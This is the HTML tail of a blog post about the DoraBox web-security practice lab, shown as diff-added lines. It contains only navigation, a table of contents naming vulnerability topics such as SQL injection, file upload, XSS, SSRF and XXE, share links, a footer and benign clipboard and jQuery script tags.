+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text"> SQLi 字符型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli%E6%90%9C%E7%B4%A2%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text"> SQLi 搜索型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-2"><span class="toc-number">2.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">2.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#js%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text"> JS 限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-3"><span class="toc-number">3.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">3.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text"> 任意文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">4.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mime%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.</span> <span class="toc-text"> MIME 限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-5"><span class="toc-number">5.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-5"><span class="toc-number">5.2.</span> <span class="toc-text"> 总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#content-description"><span class="toc-number">5.2.1.</span> <span class="toc-text"> Content-Description:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E5%90%8D%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text"> 拓展名限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-6"><span class="toc-number">6.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-6"><span class="toc-number">6.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">7.</span> <span class="toc-text"> 内容限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-7"><span class="toc-number">7.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-7"><span class="toc-number">7.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli%E6%95%B0%E5%AD%97%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text"> SQLi 数字手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-8"><span class="toc-number">8.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-8"><span class="toc-number">8.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf"><span class="toc-number">9.</span> <span class="toc-text"> SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-9"><span class="toc-number">9.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-9"><span class="toc-number">9.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">10.</span> <span class="toc-text"> 任意代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-10"><span class="toc-number">10.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-10"><span class="toc-number">10.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">11.</span> <span class="toc-text"> 任意命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-11"><span class="toc-number">11.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-11"><span class="toc-number">11.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84xss"><span class="toc-number">12.</span> <span class="toc-text"> 反射 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-12"><span class="toc-number">12.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-12"><span class="toc-number">12.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">13.</span> <span class="toc-text"> 存储型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-13"><span class="toc-number">13.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-13"><span class="toc-number">13.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dom%E5%9E%8Bxss"><span class="toc-number">14.</span> <span class="toc-text"> DOM 型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-14"><span class="toc-number">14.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-14"><span class="toc-number">14.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90"><span class="toc-number">15.</span> <span class="toc-text"> CSRF 跨域资源</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-15"><span class="toc-number">15.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-15"><span class="toc-number">15.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jsonp%E5%8A%AB%E6%8C%81"><span class="toc-number">16.</span> <span class="toc-text"> JSONP 劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-16"><span class="toc-number">16.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-16"><span class="toc-number">16.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">17.</span> <span class="toc-text"> 任意文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-17"><span class="toc-number">17.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-17"><span class="toc-number">17.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2"><span class="toc-number">18.</span> <span class="toc-text"> 任意文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-18"><span class="toc-number">18.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-18"><span class="toc-number">18.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E6%94%AF%E4%BB%98"><span class="toc-number">19.</span> <span class="toc-text"> 条件竞争 - 支付</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-19"><span class="toc-number">19.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-19"><span class="toc-number">19.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E4%B8%8A%E4%BC%A0"><span class="toc-number">20.</span> <span class="toc-text"> 条件竞争 - 上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-20"><span class="toc-number">20.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-20"><span class="toc-number">20.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">21.</span> <span class="toc-text"> 任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-21"><span class="toc-number">21.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-21"><span class="toc-number">21.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe"><span class="toc-number">22.</span> <span class="toc-text"> xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-22"><span class="toc-number">22.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-22"><span class="toc-number">22.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E5%93%A6"><span class="toc-number">23.</span> <span class="toc-text"> 最后哦</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&text=dorabox冒险手记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&is_video=false&description=dorabox冒险手记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dorabox冒险手记&body=Check out this article: http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&name=dorabox冒险手记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&t=dorabox冒险手记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
